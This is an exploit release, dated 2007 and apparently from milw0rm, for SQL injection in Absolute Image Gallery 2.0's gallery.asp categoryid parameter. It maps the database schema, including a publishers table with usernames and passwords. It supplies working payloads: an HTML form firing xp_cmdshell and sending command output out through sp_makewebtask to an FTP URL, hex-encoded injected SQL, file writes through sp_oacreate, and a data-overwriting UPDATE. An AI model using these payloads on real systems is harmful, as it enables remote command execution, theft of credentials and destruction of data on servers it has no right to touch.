@@ -1,0 +1,250 @@
+Absolute Image Gallery Gallery.ASP (categoryid) MSSQL Injection Exploit
+
+Type :
+
+SQL Injection
+
+Release Date :
+
+{2007-03-15}
+
+Product / Vendor :
+
+Absolute Image Gallery
+
+http://www.xigla.com/absoluteig/
+
+Bug :
+
+http://localhost/script/gallery.asp?action=viewimage&categoryid=-SQL Inj-
+
+---------------------------------------------------------------------------------------------------------------------------------------------
+
+Script Table/Colon Name : 
+
+---------------------------------------------------------------------------------------------------------------------------------------------
+
+Table Name : articlefiles
+
+fileid
+filetitle
+filename
+articleid
+filetype
+filecomment
+urlfile
+
+---------------------------------------------------------------------------------------------------------------------------------------------
+
+Table Name : articles
+
+articleid
+posted
+lastupdate
+headline
+headlinedate
+startdate
+enddate
+source
+summary
+articleurl
+article
+status
+autoformat
+publisherid
+clicks
+editor
+relatedid
+
+---------------------------------------------------------------------------------------------------------------------------------------------
+
+Table Name : iArticlesZones
+
+articleid
+zoneid
+
+---------------------------------------------------------------------------------------------------------------------------------------------
+
+Table Name : plugins
+
+pluginid
+pplname
+pplfile
+ppldescription
+
+---------------------------------------------------------------------------------------------------------------------------------------------
+
+Table Name : PPL1reviews
+
+reviewid
+articleid
+name
+reviewdate
+review
+comments
+isannonymous
+
+---------------------------------------------------------------------------------------------------------------------------------------------
+
+Table Name : publishers
+
+publisherid
+name
+username
+password
+email
+additional
+plevel
+
+---------------------------------------------------------------------------------------------------------------------------------------------
+
+Table Name : publisherszones
+
+publisherid
+zoneid
+
+---------------------------------------------------------------------------------------------------------------------------------------------
+
+Table Name : xlaAIGcategories
+
+categoryid
+catname
+catdesc
+supercatid
+lastupdate
+catpath
+images
+allowupload
+
+---------------------------------------------------------------------------------------------------------------------------------------------
+
+Table Name : xlaAIGimages
+
+imageid
+imagename
+imagedesc
+imagefile
+imagedate
+imagesize
+totalrating
+totalreviews
+hits
+categoryid
+status
+uploadedby
+additionalinfo
+embedhtml
+keywords
+copyright
+credit
+source
+datecreated
+email
+infourl
+
+---------------------------------------------------------------------------------------------------------------------------------------------
+
+Table Name : xlaAIGpostcards
+
+dateposted
+postcardid
+imageid
+bgcolor
+bordercolor
+fonttype
+fontcolor
+recipientname
+recipientemail
+greeting
+bgsound
+sendername
+senderemail
+sendermsg
+
+---------------------------------------------------------------------------------------------------------------------------------------------
+
+Table Name : zones
+
+zonename
+description
+template
+articlespz
+zonefont
+fontsize
+fontcolor
+showsource
+showsummary
+showdates
+showtn
+textalign
+displayhoriz
+cellcolor
+targetframe
+
+---------------------------------------------------------------------------------------------------------------------------------------------
+
+MSSQL CMD Injection Exploit(For DBO Users) :
+
+<title>Absolute Image Gallery MSSQL CMD Injection Exploit</title>
+<body bgcolor="#000000">
+<form name="Form" method="get" action="http://localhost/script/gallery.asp">
+<center><font face="Verdana" size="2" color="#FF0000"><b>Absolute Image Gallery MSSQL CMD Injection Exploit</b></font><br><br></center>
+<center><font face="Verdana" size="1" color="#00FF00"><b>Note : For DBO Users</b></font><br><br></center>
+<center><font face="Verdana" size="1" color="#00FF00"><b>Example :</b></font><br><br></center>
+  <tr>
+    <center><img src="http://img382.imageshack.us/img382/7867/dirav8.jpg"></center><br>
+    <center><td align="right"><font face="Arial" size="1" color="#00FF00">Command Exec :</td>
+    <td> </td>
+    <td><input name="action=viewimage&categoryid=-1" type="text" value=";exec master..xp_cmdshell 'dir c:\ > cmd.txt';CREATE TABLE cmd (txt varchar(8000));BULK INSERT cmd FROM 'cmd.txt';exec+sp_makewebtask+'ftp://127.0.0.1/public/file.txt','select+*+from+cmd';--" class="inputbox" style="color: #000000" style="width:300px; "></td>
+  </tr>
+  <tr>
+    <td align="right"><font face="Arial" size="1" color="#00FF00">Search Board</td>
+    <td> </td>
+    <td>
+      <select name="">
+        <option value="0">(CMD)</option>
+      </select> <br><br>
+      <input type="submit" value="Apply"></center>
+    </td>
+  </tr>
+</table>
+</form>
+<center><font face="Verdana" size="2" color="#FF0000"><b>UniquE-Key{UniquE-Cracker}</b></font>
+<br>
+<font face="Verdana" size="2" color="#FF0000"><b>UniquE@UniquE-Key.ORG</b></font>
+<br>
+<font face="Verdana" size="2" color="#FF0000"><b>http://UniquE-Key.ORG</b></font></center>
+
+---------------------------------------------------------------------------------------------------------------------------------------------
+
+Code Injection(For DBO Users) :
+
+Add Table : http://localhost/script/gallery.asp?action=viewimage&categoryid=-1;Create+table+code+(txt+varchar(8000),id+int);--
+
+ASCII Code Add Database : http://localhost/script/gallery.asp?action=viewimage&categoryid=-1;declare+@q+varchar(8000)+select+@q=0x696E7365727420696E746F2066736F373737287478742C6964292076616C7565732827272C3129+exec(@q);--
+
+Code Injection : http://localhost/script/gallery.asp?action=viewimage&categoryid=-1;declare+@txt+varchar(8000);select+@txt+=+(select+top+1+txt+from+code+where+id+=+1);declare+@o+int,+@f+int,+@t+int,+@ret+int+exec+sp_oacreate+'scripting.filesystemobject',+@o+out+exec+sp_oamethod+@o,+'createtextfile',+@f+out,+'c:/host',+1+exec+@ret+=+sp_oamethod+@f,+'writeline',+NULL,+@txt;--
+
+---------------------------------------------------------------------------------------------------------------------------------------------
+
+UPDATE(ALL users) :
+
+http://localhost/script/gallery.asp?action=viewimage&categoryid=-1 UPDATE table SET colon = 'x';--
+
+---------------------------------------------------------------------------------------------------------------------------------------------
+
+Tested :
+
+Absolute Image Gallery 2.0
+
+Vulnerable :
+
+Absolute Image Gallery 2.0
+
+Author :
+
+UniquE-Key{UniquE-Cracker}
+UniquE(at)UniquE-Key.Org
+http://www.UniquE-Key.Org
+
+# milw0rm.com [2007-03-15]
